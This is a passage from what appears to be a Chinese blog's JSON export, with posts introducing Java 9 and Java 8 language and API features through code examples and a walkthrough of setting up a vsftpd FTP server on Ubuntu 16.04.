ofNullable、dropWhile、takeWhile 和 iterate。在 代码清单 5 中，流中包含了从 1 到 5 的 元素。断言检查元素是否为奇数。第一个元素 1 被删除，结果流中包含 4 个元素。清单 5 . Stream 中的 dropWhile 方法示例 1234567@Test public void testDropWhile() throws Exception &#123; final long count = Stream.of(1, 2, 3, 4, 5) .dropWhile(i -&gt; i % 2 != 0) .count(); assertEquals(4, count); &#125; Collectors 中增加了新的方法 filtering 和 flatMapping。在 代码清单 6 中，对于输入的 String 流 ，先通过 flatMapping 把 String 映射成 Integer 流 ，再把所有的 Integer 收集到一个集合中。清单 6 . Collectors 的 flatMapping 方法示例 1234567@Test public void testFlatMapping() throws Exception &#123; final Set&lt;Integer&gt; result = Stream.of(\"a\", \"ab\", \"abc\") .collect(Collectors.flatMapping(v -&gt; v.chars().boxed(), Collectors.toSet())); assertEquals(3, result.size()); &#125; Optiona l 类中新增了 ifPresentOrElse、or 和 stream 等方法。在 代码清单 7 中，Optiona l 流中包含 3 个 元素，其中只有 2 个有值。在使用 flatMap 之后，结果流中包含了 2 个值。清单 7 . Optional 的 stream 方法示例 12345678910@Test public void testStream() throws Exception &#123; final long count = Stream.of( Optional.of(1), Optional.empty(), Optional.of(2) ).flatMap(Optional::stream) .count(); assertEquals(2, count); &#125; 进程 APIJava 9 增加了 ProcessHandle 接口，可以对原生进程进行管理，尤其适合于管理长时间运行的进程。在使用 P rocessBuilder 来启动一个进程之后，可以通过 Process.toHandle()方法来得到一个 ProcessHandl e 对象的实例。通过 ProcessHandle 可以获取到由 ProcessHandle.Info 表 示的进程的基本信息，如命令行参数、可执行文件路径和启动时间等。ProcessHandle 的 onExit()方法返回一个 C ompletableFuture对象，可以在进程结束时执行自定义的动作。 代码清单 8 中给出了进程 API 的使用示例。清单 8 . 进程API 示例 12345678910final ProcessBuilder processBuilder = new ProcessBuilder(\"top\") .inheritIO(); final ProcessHandle processHandle = processBuilder.start().toHandle(); processHandle.onExit().whenCompleteAsync((handle, throwable) -&gt; &#123; if (throwable == null) &#123; System.out.println(handle.pid()); &#125; else &#123; throwable.printStackTrace(); &#125; &#125;); 平台日志 API 和 服务Java 9 允许为 JDK 和应用配置同样的日志实现。新增的 System.LoggerFinder 用来管理 JDK 使 用的日志记录器实现。JVM 在运行时只有一个系统范围的 LoggerFinder 实例。LoggerFinder 通 过服务查找机制来加载日志记录器实现。默认情况下，JDK 使用 java.logging 模块中的 java.util.logging 实现。通过 LoggerFinder 的 getLogger()方法就可以获取到表示日志记录器的 System.Logger 实现。应用同样可以使用 System.Logger 来记录日志。这样就保证了 JDK 和应用使用同样的日志实现。我们也可以通过添加自己的 System.LoggerFinder 实现来让 JDK 和应用使用 SLF4J 等其他日志记录框架。 代码清单 9 中给出了平台日志 API 的使用示例。清单 9.使用平台日志 API 123456public class Main &#123; private static final System.Logger LOGGER = System.getLogger(\"Main\"); public static void main(final String[] args) &#123; LOGGER.log(Level.INFO, \"Run!\"); &#125; &#125; 反应式流 （ Reactive Streams ）反应式编程的思想最近得到了广泛的流行。 在 Java 平台上有流行的反应式 库 RxJava 和 R eactor。反应式流规范的出发点是提供一个带非阻塞负压（ non-blocking backpressure ） 的异步流处理规范。反应式流规范的核心接口已经添加到了 Java9 中的 java.util.concurrent.Flow 类中。 Flow 中包含了 Flow.Publisher、Flow.Subscriber、Flow.Subscription 和 F low.Processor 等 4 个核心接口。Java 9 还提供了 SubmissionPublisher 作为 Flow.Publisher 的一个实现。RxJava 2 和 Reactor 都可以很方便的 与 Flow 类的核心接口进行互操作。 并发在并发方面，类 CompletableFuture 中增加了几个新的方法。completeAsync 使用一个异步任务来获取结果并完成该 CompletableFuture。orTimeout 在 CompletableFuture 没有在给定的超时时间之前完成，使用 TimeoutException 异常来完成 CompletableFuture。completeOnTimeout 与 o rTimeout 类似，只不过它在超时时使用给定的值来完成 CompletableFuture。新的 Thread.onSpinWai t 方法在当前线程需要使用忙循环来等待时，可以提高等待的效率。 NashornNashorn 是 Java 8 中引入的新的 JavaScript 引擎。Java 9 中的 Nashorn 已经实现了一些 ECMAScript 6 规范中的新特性，包括模板字符串、二进制和八进制字面量、迭代器 和 for..of 循环和箭头函数等。Nashorn 还提供了 API 把 ECMAScript 源代码解析成抽象语法树（ Abstract Syntax Tree，AST ） ，可以用来对 ECMAScript 源代码进行分析。 I/O 流新特性类 java.io.InputStream 中增加了新的方法来读取和复制 InputStream 中包含的数据。 readAllBytes：读取 InputStream 中的所有剩余字节。 readNBytes： 从 InputStream 中读取指定数量的字节到数组中。 transferTo：读取 InputStream 中的全部字节并写入到指定的 OutputStream 中 。 代码清单 12 中给出了这些新方法的使用示例。清单 12. InputStream 中的新方法使用示例 1234567891011121314151617181920212223242526public class TestInputStream &#123; private InputStream inputStream; private static final String CONTENT = \"Hello World\"; @Before public void setUp() throws Exception &#123; this.inputStream = TestInputStream.class.getResourceAsStream(\"/input.txt\"); &#125; @Test public void testReadAllBytes() throws Exception &#123; final String content = new String(this.inputStream.readAllBytes()); assertEquals(CONTENT, content); &#125; @Test public void testReadNBytes() throws Exception &#123; final byte[] data = new byte[5]; this.inputStream.readNBytes(data, 0, 5); assertEquals(\"Hello\", new String(data)); &#125; @Test public void testTransferTo() throws Exception &#123; final ByteArrayOutputStream outputStream = new ByteArrayOutputStream(); this.inputStream.transferTo(outputStream); assertEquals(CONTENT, outputStream.toString()); &#125; &#125; ObjectInputFilter 可以对 ObjectInputStream 中 包含的内容进行检查，来确保其中包含的数据是合法的。可以使用 ObjectInputStream 的方法 setObjectInputFilter 来设置。ObjectInputFilter 在 进行检查时，可以检查如对象图的最大深度、对象引用的最大数量、输入流中的最大字节数和数组的最大长度等限制，也可以对包含的类的名称进行限制。 改进应用安全性能Java 9 新增了 4 个 SHA- 3 哈希算法，SHA3-224、SHA3-256、SHA3-384 和 S HA3-512。另外也增加了通过 java.security.SecureRandom 生成使用 DRBG 算法的强随机数。 代码清单 13 中给出了 SHA-3 哈希算法的使用示例。清单 13. SHA-3 哈希算法使用示例 12345678import org.apache.commons.codec.binary.Hex; public class SHA3 &#123; public static void main(final String[] args) throws NoSuchAlgorithmException &#123; final MessageDigest instance = MessageDigest.getInstance(\"SHA3-224\"); final byte[] digest = instance.digest(\"\".getBytes()); System.out.println(Hex.encodeHexString(digest)); &#125; &#125; 统一 JVM 日志Java 9 中 ，JVM 有了统一的日志记录系统，可以使用新的命令行选项-Xlog 来控制 JVM 上 所有组件的日志记录。该日志记录系统可以设置输出的日志消息的标签、级别、修饰符和输出目标等。Java 9 移除了在 Java 8 中 被废弃的垃圾回收器配置组合，同时 把 G1 设为默认的垃圾回收器实现。另外，CMS 垃圾回收器已经被声明为废弃。Java 9 也增加了很多可以通过 jcmd 调用的诊断命令。 Java 语言本身改动在 Java 语言本身，Java 9 允许在接口中使用私有方法。 在 try-with-resources 语句中可以使用 e ffectively-final 变量。 类 java.lang.StackWalker 可 以对线程的堆栈进行遍历，并且支持过滤和延迟访问。Java 9 把对 Unicode 的支持升级到了 8.0。ResourceBundle 加载属性文件的默认编码从 ISO-8859-1 改成了 UTF-8，不再需要使用 native2ascii 命 令来对属性文件进行额外处理。注解@Deprecated 也得到了增强，增加了 since 和 forRemoval 两 个属性，可以分别指定一个程序元素被废弃的版本，以及是否会在今后的版本中被删除。 在 代码清单 14 中，buildMessage 是接口 SayHi 中的私有方法，在默认方法 sayHi 中被使用。清单 14. 接口中私有方法的示例123456789public interface SayHi &#123; private String buildMessage() &#123; return \"Hello\"; &#125; void sayHi(final String message); default void sayHi() &#123; sayHi(buildMessage()); &#125; &#125; 其他特性其他的看不懂，不写出来了。 更多信息请看 Java 9 新特性介绍","categories":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/categories/Java/"}],"tags":[]},{"title":"JDK 8 新特性","slug":"Java/JDK 8 新特性2","date":"2019-06-15T01:51:36.000Z","updated":"2021-12-28T03:24:10.146Z","comments":true,"path":"Java/JDK 8 新特性2/","link":"","permalink":"http://yoursite.com/Java/JDK 8 新特性2/","excerpt":"","text":"原文链接 函数式接口Java 8 引入的一个核心概念是函数式接口（Functional Interfaces）。通过在接口里面添加一个抽象方法，这些方法可以直接从接口中运行。如果一个接口定义个唯一一个抽象方法，那么这个接口就成为函数式接口。同时，引入了一个新的注解：@FunctionalInterface。可以把他它放在一个接口前，表示这个接口是一个函数式接口。这个注解是非必须的，只要接口只包含一个方法的接口，虚拟机会自动判断，不过最好在接口上使用注解 @FunctionalInterface 进行声明。在接口中添加了 @FunctionalInterface 的接口，只允许有一个抽象方法，否则编译器也会报错。 java.lang.Runnable 就是一个函数式接口。 1234@FunctionalInterfacepublic interface Runnable &#123;public abstract void run();&#125; Lambda 表达式函数式接口的重要属性是：我们能够使用 Lambda 实例化它们，Lambda 表达式让你能够将函数作为方法参数，或者将代码作为数据对待。Lambda 表达式的引入给开发者带来了不少优点：在 Java 8 之前，匿名内部类，监听器和事件处理器的使用都显得很冗长，代码可读性很差，Lambda 表达式的应用则使代码变得更加紧凑，可读性增强；Lambda 表达式使并行操作大集合变得很方便，可以充分发挥多核 CPU 的优势，更易于为多核处理器编写代码； Lambda 表达式由三个部分组成：第一部分为一个括号内用逗号分隔的形式参数，参数是函数式接口里面方法的参数；第二部分为一个箭头符号：-&gt;；第三部分为方法体，可以是表达式和代码块。语法如下： 方法体为表达式，该表达式的值作为返回值返回。 1(parameters) -&gt; expression 方法体为代码块，必须用 {} 来包裹起来，且需要一个 return 返回值，但若函数式接口里面方法返回值是 void，则无需返回值。 1(parameters) -&gt; &#123; statements; &#125; 例如，下面是使用匿名内部类和 Lambda 表达式的代码比较。 下面是用匿名内部类的代码： 123456button.addActionListener(new ActionListener() &#123;@Overridepublic void actionPerformed(ActionEvent e) &#123;System.out.print(\"Helllo Lambda in actionPerformed\");&#125;&#125;); 下面是使用 Lambda 表达式后：12345button.addActionListener(\\\\actionPerformed 有一个参数 e 传入，所以用 (ActionEvent e)(ActionEvent e)-&gt; System.out.print(\"Helllo Lambda in actionPerformed\")); 上面是方法体包含了参数传入 (ActionEvent e)，如果没有参数则只需 ( )，例如 Thread 中的 run 方法就没有参数传入，当它使用 Lambda 表达式后： 123456Thread t = new Thread(\\\\run 没有参数传入，所以用 (), 后面用 &#123;&#125; 包起方法体() -&gt; &#123; System.out.println(\"Hello from a thread in run\");&#125;); 通过上面两个代码的比较可以发现使用 Lambda 表达式可以简化代码，并提高代码的可读性。为了进一步简化 Lambda 表达式，可以使用方法引用。例如，下面三种分别是使用内部类，使用 Lambda 表示式和使用方法引用方式的比较：1234567891011//1. 使用内部类Function&lt;Integer, String&gt; f = new Function&lt;Integer,String&gt;()&#123;@Overridepublic String apply(Integer t) &#123;return null;&#125;&#125;;//2. 使用 Lambda 表达式Function&lt;Integer, String&gt; f2 = (t)-&gt;String.valueOf(t); //3. 使用方法引用的方式Function&lt;Integer, String&gt; f1 = String::valueOf; 要使用 Lambda 表达式，需要定义一个函数式接口，这样往往会让程序充斥着过量的仅为 Lambda 表达式服务的函数式接口。为了减少这样过量的函数式接口，Java 8 在 java.util.function 中增加了不少新的函数式通用接口。例如： Function&lt;T, R&gt;：将 T 作为输入，返回 R 作为输出，他还包含了和其他函数组合的默认方法。 Predicate ：将 T 作为输入，返回一个布尔值作为输出，该接口包含多种默认方法来将 Predicate 组合成其他复杂的逻辑（与、或、非）。 Consumer ：将 T 作为输入，不返回任何内容，表示在单个参数上的操作。 例如，People 类中有一个方法 getMaleList 需要获取男性的列表，这里需要定义一个函数式接口12345678910111213141516171819PersonInterface：interface PersonInterface &#123; public boolean test(Person person);&#125;public class People &#123; private List&lt;Person&gt; persons= new ArrayList&lt;Person&gt;(); public List&lt;Person&gt; getMaleList(PersonInterface filter) &#123; List&lt;Person&gt; res = new ArrayList&lt;Person&gt;(); persons.forEach( (Person person) -&gt; &#123; if (filter.test(person)) &#123;//调用 PersonInterface 的方法 res.add(person); &#125; &#125; ); return res; &#125;&#125; 为了去除 PersonInterface 这个函数式接口，可以用通用函数式接口 Predicate 替代如下：12345678910111213class People&#123; private List&lt;Person&gt; persons= new ArrayList&lt;Person&gt;(); public List&lt;Person&gt; getMaleList(Predicate&lt;Person&gt; predicate) &#123; List&lt;Person&gt; res = new ArrayList&lt;Person&gt;(); persons.forEach( person -&gt; &#123; if (predicate.test(person)) &#123;//调用 Predicate 的抽象方法 test res.add(person); &#125; &#125;); return res; &#125;&#125; 接口的增强Java 8 对接口做了进一步的增强。在接口中可以添加使用 default 关键字修饰的非抽象方法。还可以在接口中定义静态方法。如今，接口看上去与抽象类的功能越来越类似了。默认方法 Java 8 还允许我们给接口添加一个非抽象的方法实现，只需要使用 default 关键字即可，这个特征又叫做扩展方法。在实现该接口时，该默认扩展方法在子类上可以直接使用，它的使用方式类似于抽象类中非抽象成员方法。但扩展方法不能够重载 Object 中的方法。例如：toString、equals、 hashCode 不能在接口中被重载。 例如，下面接口中定义了一个默认方法 count()，该方法可以在子类中直接使用。 12345678910111213public interface DefaultFunInterface &#123;//定义默认方法 countdefault int count()&#123;return 1;&#125;&#125;public class SubDefaultFunClass implements DefaultFunInterface &#123;public static void main(String[] args)&#123;//实例化一个子类对象，改子类对象可以直接调用父接口中的默认方法 count SubDefaultFunClass sub = new SubDefaultFunClass();sub.count();&#125;&#125; 静态方法 在接口中，还允许定义静态的方法。接口中的静态方法可以直接用接口来调用。 例如，下面接口中定义了一个静态方法 find，该方法可以直接用 StaticFunInterface .find() 来调用。 1234567891011public interface StaticFunInterface &#123;public static int find()&#123;return 1;&#125;&#125;public class TestStaticFun &#123;public static void main(String[] args)&#123;//接口中定义了静态方法 find 直接被调用StaticFunInterface.fine();&#125;&#125; 集合之流式操作Java 8 引入了流式操作（Stream），通过该操作可以实现对集合（Collection）的并行处理和函数式操作。根据操作返回的结果不同，流式操作分为中间操作和最终操作两种。最终操作返回一特定类型的结果，而中间操作返回流本身，这样就可以将多个操作依次串联起来。根据流的并发性，流又可以分为串行和并行两种。流式操作实现了集合的过滤、排序、映射等功能。 Stream 和 Collection 集合的区别：Collection 是一种静态的内存数据结构，而 Stream 是有关计算的。前者是主要面向内存，存储在内存中，后者主要是面向 CPU，通过 CPU 实现计算。串行和并行的流 流有串行和并行两种，串行流上的操作是在一个线程中依次完成，而并行流则是在多个线程上同时执行。并行与串行的流可以相互切换：通过 stream.sequential() 返回串行的流，通过 stream.parallel() 返回并行的流。相比较串行的流，并行的流可以很大程度上提高程序的执行效率。 下面是分别用串行和并行的方式对集合进行排序。 串行排序： 12345678910List&lt;String&gt; list = new ArrayList&lt;String&gt;();for(int i=0;i&lt;1000000;i++)&#123;double d = Math.random()*1000;list.add(d+\"\");&#125;long start = System.nanoTime();//获取系统开始排序的时间点int count= (int) ((Stream) list.stream().sequential()).sorted().count();long end = System.nanoTime();//获取系统结束排序的时间点long ms = TimeUnit.NANOSECONDS.toMillis(end-start);//得到串行排序所用的时间System.out.println(ms+”ms”); 并行排序： 12345678910List&lt;String&gt; list = new ArrayList&lt;String&gt;();for(int i=0;i&lt;1000000;i++)&#123;double d = Math.random()*1000;list.add(d+\"\");&#125;long start = System.nanoTime();//获取系统开始排序的时间点int count = (int)((Stream) list.stream().parallel()).sorted().count();long end = System.nanoTime();//获取系统结束排序的时间点long ms = TimeUnit.NANOSECONDS.toMillis(end-start);//得到并行排序所用的时间System.out.println(ms+”ms”); 串行输出为 1200ms，并行输出为 800ms。可见，并行排序的时间相比较串行排序时间要少不少。 中间操作该操作会保持 stream 处于中间状态，允许做进一步的操作。它返回的还是的 Stream，允许更多的链式操作。常见的中间操作有： filter()：对元素进行过滤； sorted()：对元素排序； map()：元素的映射； distinct()：去除重复元素； subStream()：获取子 Stream 等。 例如，下面是对一个字符串集合进行过滤，返回以“s”开头的字符串集合，并将该集合依次打印出来： 123list.stream().filter((s) -&gt; s.startsWith(\"s\")).forEach(System.out::println); 这里的 filter(…) 就是一个中间操作，该中间操作可以链式地应用其他 Stream 操作。终止操作 该操作必须是流的最后一个操作，一旦被调用，Stream 就到了一个终止状态，而且不能再使用了。常见的终止操作有： forEach()：对每个元素做处理； toArray()：把元素导出到数组； findFirst()：返回第一个匹配的元素； anyMatch()：是否有匹配的元素等。 例如，下面是对一个字符串集合进行过滤，返回以“s”开头的字符串集合，并将该集合依次打印出来：123list.stream() //获取列表的 stream 操作对象.filter((s) -&gt; s.startsWith(\"s\"))//对这个流做过滤操作.forEach(System.out::println); 这里的 forEach(…) 就是一个终止操作，该操作之后不能再链式的添加其他操作了。 注解的更新对于注解，Java 8 主要有两点改进：类型注解和重复注解。 Java 8 的类型注解扩展了注解使用的范围。在该版本之前，注解只能是在声明的地方使用。现在几乎可以为任何东西添加注解：局部变量、类与接口，就连方法的异常也能添加注解。新增的两个注释的程序元素类型 ElementType.TYPE_USE 和 ElementType.TYPE_PARAMETER 用来描述注解的新场合。ElementType.TYPE_PARAMETER 表示该注解能写在类型变量的声明语句中。而 ElementType.TYPE_USE 表示该注解能写在使用类型的任何语句中（例如声明语句、泛型和强制转换语句中的类型）。 对类型注解的支持，增强了通过静态分析工具发现错误的能力。原先只能在运行时发现的问题可以提前在编译的时候被排查出来。Java 8 本身虽然没有自带类型检测的框架，但可以通过使用 Checker Framework 这样的第三方工具，自动检查和确认软件的缺陷，提高生产效率。 例如，下面的代码可以通过编译，但是运行时会报 NullPointerException 的异常。 123456public class TestAnno &#123;public static void main(String[] args) &#123;Object obj = null;obj.toString();&#125;&#125; 为了能在编译期间就自动检查出这类异常，可以通过类型注解结合 Checker Framework 提前排查出来： 1234567import org.checkerframework.checker.nullness.qual.NonNull;public class TestAnno &#123;public static void main(String[] args) &#123;@NonNull Object obj = null;obj.toString();&#125;&#125; 编译时自动检测结果如下： 1234567C:\\workspace\\TestJava8\\src\\TestAnno.java:4: Warning: (assignment.type.incompatible) $$ 2 $$ null $$ @UnknownInitialization @NonNull Object $$ ( 152, 156 ) $$ incompatible types in assignment.@NonNull Object obj = null; ^ found : null required: @UnknownInitialization @NonNull Object 另外，在该版本之前使用注解的一个限制是相同的注解在同一位置只能声明一次，不能声明多次。Java 8 引入了重复注解机制，这样相同的注解可以在同一地方声明多次。重复注解机制本身必须用 @Repeatable 注解。 例如，下面就是用 @Repeatable 重复注解的例子： 1234567891011121314151617181920@Retention(RetentionPolicy.RUNTIME) \\\\该注解存在于类文件中并在运行时可以通过反射获取@interface Annots &#123;Annot[] value();&#125; @Retention(RetentionPolicy.RUNTIME) \\\\该注解存在于类文件中并在运行时可以通过反射获取@Repeatable(Annots.class)@interface Annot &#123;String value();&#125;@Annot(\"a1\")@Annot(\"a2\")public class Test &#123;public static void main(String[] args) &#123;Annots annots1 = Test.class.getAnnotation(Annots.class);System.out.println(annots1.value()[0]+\",\"+annots1.value()[1]); // 输出: @Annot(value=a1),@Annot(value=a2)Annot[] annots2 = Test.class.getAnnotationsByType(Annot.class);System.out.println(annots2[0]+\",\"+annots2[1]); // 输出: @Annot(value=a1),@Annot(value=a2)&#125;&#125; 注释 Annot 被 @Repeatable( Annots.class ) 注解。Annots 只是一个容器，它包含 Annot 数组, 编译器尽力向程序员隐藏它的存在。通过这样的方式，Test 类可以被 Annot 注解两次。重复注释的类型可以通过 getAnnotationsByType() 方法来返回。 安全性现今，互联网环境中存在各种各种潜在的威胁，对于 Java 平台来说，安全显得特别重要。为了保证新版本具有更高的安全性，Java 8 在安全性上对许多方面进行了增强，也为此推迟了它的发布日期。下面例举其中几个关于安全性的更新： 支持更强的基于密码的加密算法。基于 AES 的加密算法，例如 PBEWithSHA256AndAES_128 和 PBEWithSHA512AndAES_256，已经被加入进来。 在客户端，TLS1.1 和 TLS1.2 被设为默认启动。并且可以通过新的系统属性包 jdk.tls.client.protocols 来对它进行配置。 Keystore 的增强，包含新的 Keystore 类型 java.security.DomainLoadStoreParameter 和为 Keytool 这个安全钥匙和证书的管理工具添加新的命令行选项-importpassword。同时，添加和更新了一些关于安全性的 API 来支持 KeyStore 的更新。 支持安全的随机数发生器。如果随机数来源于随机性不高的种子，那么那些用随机数来产生密钥或者散列敏感信息的系统就更易受攻击。SecureRandom 这个类的 getInstanceStrong 方法如今可以获取各个平台最强的随机数对象实例，通过这个实例生成像 RSA 私钥和公钥这样具有较高熵的随机数。 JSSE（Java(TM) Secure Socket Extension）服务器端开始支持 SSL/TLS 服务器名字识别 SNI（Server Name Indication）扩展。SNI 扩展目的是 SSL/TLS 协议可以通过 SNI 扩展来识别客户端试图通过握手协议连接的服务器名字。在 Java 7 中只在客户端默认启动 SNI 扩展。如今，在 JSSE 服务器端也开始支持 SNI 扩展了。 安全性比较差的加密方法被默认禁用。默认不支持 DES 相关的 Kerberos 5 加密方法。如果一定要使用这类弱加密方法需要在 krb5.conf 文件中添加 allow_weak_crypto=true。考虑到这类加密方法安全性极差，开发者应该尽量避免使用它。 IO/NIO 的改进Java 8 对 IO/NIO 也做了一些改进。主要包括：改进了 java.nio.charset.Charset 的实现，使编码和解码的效率得以提升，也精简了 jre/lib/charsets.jar 包；优化了 String(byte[],*) 构造方法和 String.getBytes() 方法的性能；还增加了一些新的 IO/NIO 方法，使用这些方法可以从文件或者输入流中获取流（java.util.stream.Stream），通过对流的操作，可以简化文本行处理、目录遍历和文件查找。 新增的 API 如下： BufferedReader.line(): 返回文本行的流 Stream File.lines(Path, Charset):返回文本行的流 Stream File.list(Path): 遍历当前目录下的文件和目录 File.walk(Path, int, FileVisitOption): 遍历某一个目录下的所有文件和指定深度的子目录 File.find(Path, int, BiPredicate, FileVisitOption… ): 查找相应的文件 下面就是用流式操作列出当前目录下的所有文件和目录： 12Files.list(new File(\".\").toPath()) .forEach(System.out::println); 全球化功能Java 8 版本还完善了全球化功能：支持新的 Unicode 6.2.0 标准，新增了日历和本地化的 API，改进了日期时间的管理等。 Java 的日期与时间 API 问题由来已久，Java 8 之前的版本中关于时间、日期及其他时间日期格式化类由于线程安全、重量级、序列化成本高等问题而饱受批评。Java 8 吸收了 Joda-Time 的精华，以一个新的开始为 Java 创建优秀的 API。新的 java.time 中包含了所有关于时钟（Clock），本地日期（LocalDate）、本地时间（LocalTime）、本地日期时间（LocalDateTime）、时区（ZonedDateTime）和持续时间（Duration）的类。历史悠久的 Date 类新增了 toInstant() 方法，用于把 Date 转换成新的表示形式。这些新增的本地化时间日期 API 大大简化了了日期时间和本地化的管理。 例如，下面是对 LocalDate，LocalTime 的简单应用： 1234567891011121314//LocalDateLocalDate localDate = LocalDate.now(); //获取本地日期localDate = LocalDate.ofYearDay(2014, 200); // 获得 2014 年的第 200 天 System.out.println(localDate.toString());//输出：2014-07-19localDate = LocalDate.of(2014, Month.SEPTEMBER, 10); //2014 年 9 月 10 日 System.out.println(localDate.toString());//输出：2014-09-10//LocalTimeLocalTime localTime = LocalTime.now(); //获取当前时间System.out.println(localTime.toString());//输出当前时间localTime = LocalTime.of(10, 20, 50);//获得 10:20:50 的时间点System.out.println(localTime.toString());//输出: 10:20:50//Clock 时钟Clock clock = Clock.systemDefaultZone();//获取系统默认时区 (当前瞬时时间 )long millis = clock.millis();// 结束语Java 8 正式版是一个有重大改变的版本，该版本对 Java 做了重大改进。本文通过文字描述及代码实例对新版本中主要新特性做了介绍：函数式接口、Lambda 表达式、集合的流式操作、注解、安全性、IO/NIO、全球化功能。除了文中介绍的这些重要的新功能之外，Java 8 还对 java 工具包 JDBC、Java DB、JavaFX 等方面都有许多改进和增强。这些新增功能简化了开发，提升了代码可读性，增强了代码的安全性，提高了代码的执行效率，为开发者带来了全新的 Java 开发体验，从而推动了 Java 这个平台的前进。","categories":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/categories/Java/"}],"tags":[]},{"title":"Ubuntu 16.04.4 LTS搭建FTP服务","slug":"Linux/Ubuntu 16.04.4 LTS搭建FTP服务","date":"2019-06-12T11:52:36.000Z","updated":"2021-12-28T03:24:10.170Z","comments":true,"path":"Linux/Ubuntu 16.04.4 LTS搭建FTP服务/","link":"","permalink":"http://yoursite.com/Linux/Ubuntu 16.04.4 LTS搭建FTP服务/","excerpt":"","text":"安装/删除12345$ apt-get update$ apt-get install vsftpd$ vsftpd -vvsftpd: version 3.0.3$ apt-get purge vsftpd 创建ftp用户创建一个不能登录到系统的用户，用于vsftpd文件读写1234567$ mkdir /home/ftpsam$ chown ftpsam:ftpsam /home/ftpsam$ useradd -d /home/ftpsam -s /sbin/nologin ftpsam$ passwd ftpsamEnter new UNIX password: Retype new UNIX password: passwd: password updated successfully 新建文件，存放允许访问ftp的用户1234$ vim /etc/vsftpd.users#将刚创建的用户名输进去，一行一个用户ftpsam 修改配置注意每行后面不能有空格，否则启动服务失败123456789101112131415$ vim /etc/vsftpd.conf#允许写write_enable=YESlocal_umask=022#此版本PAM服务的名称改为ftp才行，否则一直报500登录错误pam_service_name=ftp#指定登录用户local_enable=YESlocal_root=/home/ftpsamuserlist_file=/etc/vsftpd.usersuserlist_enable=YESuserlist_deny=NO 权限 12chroot_local_user=YESallow_writeable_chroot=YES 注意: allow_writeable_chroot 会有安全问题，此处没有做深入验证。 连接用ftpclient工具连接的话，用户密码就是我们系统中的ftpsam了，端口是21。 最终运行的完整配置/etc/vsftpd.conf12345678910111213141516171819202122232425listen=NOlisten_ipv6=YESanonymous_enable=NOlocal_enable=YESwrite_enable=YESlocal_umask=022dirmessage_enable=YESuse_localtime=YESxferlog_enable=YESconnect_from_port_20=YESftpd_banner=Welcome to FTPSam service.chroot_local_user=YESsecure_chroot_dir=/var/run/vsftpd/emptypam_service_name=ftprsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pemrsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.keyssl_enable=NOutf8_filesystem=YES#addlocal_root=/home/ftpsamuserlist_enable=YESuserlist_file=/etc/vsftpd.usersuserlist_deny=NOallow_writeable_chroot=YES#add 初始完整的配置文件(未修改的)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155 1 # Example config file /etc/vsftpd.conf 2 # 3 # The default compiled in settings are fairly paranoid. This sample file 4 # loosens things up a bit, to make the ftp daemon more usable. 5 # Please see vsftpd.conf.5 for all compiled in defaults. 6 # 7 # READ THIS: This example file is NOT an exhaustive list of vsftpd options. 8 # Please read the vsftpd.conf.5 manual page to get a full idea of vsftpd's 9 # capabilities. 10 # 11 # 12 # Run standalone? vsftpd can run either from an inetd or as a standalone 13 # daemon started from an initscript. 14 listen=NO 15 # 16 # This directive enables listening on IPv6 sockets. By default, listening 17 # on the IPv6 \"any\" address (::) will accept connections from both IPv6 18 # and IPv4 clients. It is not necessary to listen on *both* IPv4 and IPv6 19 # sockets. If you want that (perhaps because you want to listen on specific 20 # addresses) then you must run two copies of vsftpd with two configuration 21 # files. 22 listen_ipv6=YES 23 # 24 # Allow anonymous FTP? (Disabled by default). 25 anonymous_enable=NO 26 # 27 # Uncomment this to allow local users to log in. 28 local_enable=YES 29 # 30 # Uncomment this to enable any form of FTP write command. 31 #write_enable=YES 32 # 33 # Default umask for local users is 077. You may wish to change this to 022, 34 # if your users expect that (022 is used by most other ftpd's) 35 #local_umask=022 36 # 37 # Uncomment this to allow the anonymous FTP user to upload files. This only 38 # has an effect if the above global write enable is activated. Also, you will 39 # obviously need to create a directory writable by the FTP user. 40 #anon_upload_enable=YES 41 # 42 # Uncomment this if you want the anonymous FTP user to be able to create 43 # new directories. 44 #anon_mkdir_write_enable=YES 45 # 46 # Activate directory messages - messages given to remote users when they 47 # go into a certain directory. 48 dirmessage_enable=YES 49 # 50 # If enabled, vsftpd will display directory listings with the time 51 # in your local time zone. The default is to display GMT. The 52 # times returned by the MDTM FTP command are also affected by this 53 # option. 54 use_localtime=YES 55 # 56 # Activate logging of uploads/downloads. 57 xferlog_enable=YES 58 # 59 # Make sure PORT transfer connections originate from port 20 (ftp-data). 60 connect_from_port_20=YES 61 # 62 # If you want, you can arrange for uploaded anonymous files to be owned by 63 # a different user. Note! Using \"root\" for uploaded files is not 64 # recommended! 65 #chown_uploads=YES 66 #chown_username=whoever 67 # 68 # You may override where the log file goes if you like. The default is shown 69 # below. 70 #xferlog_file=/var/log/vsftpd.log 71 # 72 # If you want, you can have your log file in standard ftpd xferlog format. 73 # Note that the default log file location is /var/log/xferlog in this case. 74 #xferlog_std_format=YES 75 # 76 # You may change the default value for timing out an idle session. 77 #idle_session_timeout=600 78 # 79 # You may change the default value for timing out a data connection. 80 #data_connection_timeout=120 81 # 82 # It is recommended that you define on your system a unique user which the 83 # ftp server can use as a totally isolated and unprivileged user. 84 #nopriv_user=ftpsecure 85 # 86 # Enable this and the server will recognise asynchronous ABOR requests. Not 87 # recommended for security (the code is non-trivial). Not enabling it, 88 # however, may confuse older FTP clients. 89 #async_abor_enable=YES 90 # 91 # By default the server will pretend to allow ASCII mode but in fact ignore 92 # the request. Turn on the below options to have the server actually do ASCII 93 # mangling on files when in ASCII mode. 94 # Beware that on some FTP servers, ASCII support allows a denial of service 95 # attack (DoS) via the command \"SIZE /big/file\" in ASCII mode. vsftpd 96 # predicted this attack and has always been safe, reporting the size of the 97 # raw file. 98 # ASCII mangling is a horrible feature of the protocol. 99 #ascii_upload_enable=YES100 #ascii_download_enable=YES101 #102 # You may fully customise the login banner string:103 #ftpd_banner=Welcome to blah FTP service.104 #105 # You may specify a file of disallowed anonymous e-mail addresses. Apparently106 # useful for combatting certain DoS attacks.107 #deny_email_enable=YES108 # (default follows)109 #banned_email_file=/etc/vsftpd.banned_emails110 #111 # You may restrict local users to their home directories. See the FAQ for112 # the possible risks in this before using chroot_local_user or113 # chroot_list_enable 